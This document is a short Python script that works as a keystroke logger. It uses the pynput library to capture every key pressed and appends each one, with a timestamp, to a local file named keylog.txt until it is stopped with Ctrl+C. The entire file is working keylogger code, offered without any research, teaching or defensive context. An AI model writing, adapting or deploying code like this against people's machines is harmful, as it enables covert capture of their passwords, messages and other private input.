from pynput import keyboard
import time

def on_key_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)
    log_file = open("keylog.txt", "a")
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    log_file.write(f"{timestamp} - {key_char}\n")
    log_file.close()

def main():
    print("Logger Started, Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Logger Stopped.")

if __name__ == "__main__":
    main()
